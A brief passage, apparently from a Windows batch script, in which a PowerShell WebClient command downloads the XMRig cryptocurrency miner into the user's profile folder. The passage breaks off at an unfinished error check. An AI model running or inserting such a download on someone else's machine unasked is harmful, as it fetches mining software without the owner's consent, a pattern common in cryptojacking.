...
powershell -Command "$wc = New-Object System.Net.WebClient; $wc.DownloadFile('https://github.com/xmrig/xmrig/releases/download/v2.12.0/xmrig-2.12.0-msvc-win64.zip', '%USERPROFILE%\xmrig.zip')"
if errorlevel 1 (
